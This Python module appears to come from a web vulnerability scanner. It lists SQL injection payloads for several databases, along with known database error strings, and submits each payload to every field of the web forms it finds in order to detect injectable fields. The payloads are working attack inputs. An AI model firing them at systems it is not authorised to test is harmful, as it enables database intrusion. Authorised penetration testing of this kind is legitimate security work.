import requests
from urllib.parse import urljoin
from colorama import Fore, Style
import re

# SQL injection payloads for different databases
SQLI_PAYLOADS = [
    # Basic injection tests
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    
    # Union-based tests
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    
    # Time-based blind tests
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    
    # Boolean-based blind tests
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 'a'='a",
    "' OR 'a'='b",
    
    # Error-based tests
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
]

# SQL error signatures for different databases
SQL_ERRORS = [
    # MySQL
    "mysql_fetch_array", "mysql_num_rows", "mysql_fetch_assoc",
    "mysql_fetch_row", "mysql_connect", "mysql_result",
    "You have an error in your SQL syntax",
    "mysql server version for the right syntax",
    
    # PostgreSQL
    "pg_query", "pg_fetch_array", "pg_num_rows", "pg_connect",
    "PostgreSQL query failed", "supplied argument is not a valid PostgreSQL result",
    "syntax error at or near",
    
    # MSSQL
    "mssql_query", "mssql_fetch_array", "mssql_num_rows",
    "Microsoft OLE DB Provider", "ODBC Microsoft Access Driver",
    "Unclosed quotation mark", "Incorrect syntax near",
    
    # Oracle
    "ociexecute", "ocifetchstatement", "ora_fetch_into",
    "ORA-00933", "ORA-00921", "ORA-00936",
    
    # SQLite
    "sqlite_query", "sqlite_fetch_array", "sqlite_num_rows",
    "SQLite/JDBCDriver", "System.Data.SQLite.SQLiteException",
    
    # Generic SQL errors
    "SQL syntax", "database error", "warning: mysql",
    "valid MySQL result", "MySqlClient", "ORA-01756"
]

def test_sqli(links, forms, progress_callback=None):
    """
    Test forms for SQL injection vulnerabilities
    Args:
        links: List of URLs (unused but kept for compatibility)
        forms: List of (url, form_element) tuples
        progress_callback: Optional callback for progress updates
    Returns:
        List of vulnerability findings
    """
    findings = []
    
    for url, form in forms:
        try:
            # Get form action and method
            action = form.get("action")
            if action:
                action = urljoin(url, action)
            else:
                action = url
                
            method = form.get("method", "get").lower()
            
            # Get all input fields
            inputs = {}
            for input_field in form.find_all(["input", "textarea", "select"]):
                name = input_field.get("name")
                if name:
                    field_type = input_field.get("type", "text")
                    
                    # Skip certain input types
                    if field_type.lower() in ["submit", "button", "reset", "file", "image"]:
                        continue
                        
                    # Use appropriate default values
                    if field_type.lower() == "email":
                        inputs[name] = "test@example.com"
                    elif field_type.lower() == "password":
                        inputs[name] = "password123"
                    elif field_type.lower() == "number":
                        inputs[name] = "123"
                    else:
                        inputs[name] = "test_value"
            
            if not inputs:
                continue

            # Test each payload
            for payload in SQLI_PAYLOADS:
                test_inputs = inputs.copy()
                
                # Inject payload into each field
                for field_name in test_inputs:
                    test_inputs[field_name] = payload
                    
                    try:
                        session = requests.Session()
                        session.headers.update({
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        })
                        
                        if method == "post":
                            response = session.post(action, data=test_inputs, timeout=15, allow_redirects=True)
                        else:
                            response = session.get(action, params=test_inputs, timeout=15, allow_redirects=True)
                        
                        response_text = response.text.lower()
                        
                        # Check for SQL error signatures
                        sql_error_found = False
                        detected_error = ""
                        
                        for error_sig in SQL_ERRORS:
                            if error_sig.lower() in response_text:
                                sql_error_found = True
                                detected_error = error_sig
                                break
                        
                        # Also check for time-based SQLi (basic detection)
                        time_based_indicators = ["sleep", "waitfor", "pg_sleep"]
                        is_time_based = any(indicator in payload.lower() for indicator in time_based_indicators)
                        
                        if sql_error_found or (is_time_based and response.elapsed.total_seconds() > 4):
                            vuln_type = "Time-based SQLi" if is_time_based else "Error-based SQLi"
                            
                            finding = {
                                "type": "SQL Injection",
                                "subtype": vuln_type,
                                "url": url,
                                "details": f"Possible {vuln_type} in field '{field_name}' at {action}",
                                "payload": payload,
                                "method": method.upper(),
                                "error_signature": detected_error if detected_error else "Time delay detected",
                                "severity": "critical"
                            }
                            
                            # Avoid duplicate findings
                            if not any(f['url'] == finding['url'] and f['details'] == finding['details'] for f in findings):
                                findings.append(finding)
                                print(f"{Fore.RED}[!] SQLi Found: {url} - Field: {field_name} - Type: {vuln_type}{Style.RESET_ALL}")
                            break  # Found SQLi in this field, try next field
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate time-based SQLi
                        if any(indicator in payload.lower() for indicator in ["sleep", "waitfor", "pg_sleep"]):
                            finding = {
                                "type": "SQL Injection",
                                "subtype": "Time-based SQLi (Timeout)",
                                "url": url,
                                "details": f"Possible time-based SQLi in field '{field_name}' at {action} (timeout)",
                                "payload": payload,
                                "method": method.upper(),
                                "error_signature": "Request timeout",
                                "severity": "critical"
                            }
                            
                            if not any(f['url'] == finding['url'] and f['details'] == finding['details'] for f in findings):
                                findings.append(finding)
                                print(f"{Fore.RED}[!] SQLi Found (Timeout): {url} - Field: {field_name}{Style.RESET_ALL}")
                        
                        print(f"{Fore.YELLOW}[!] Timeout testing SQLi on {action}{Style.RESET_ALL}")
                    except requests.exceptions.RequestException:
                        pass  # Continue with next test
                    except Exception:
                        pass  # Continue with next test
                    
                    # Reset for next field test  
                    test_inputs[field_name] = inputs[field_name]
                    
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error testing SQLi on {url}: {str(e)[:100]}{Style.RESET_ALL}")
            
        if progress_callback:
            progress_callback(1)
    
    return findings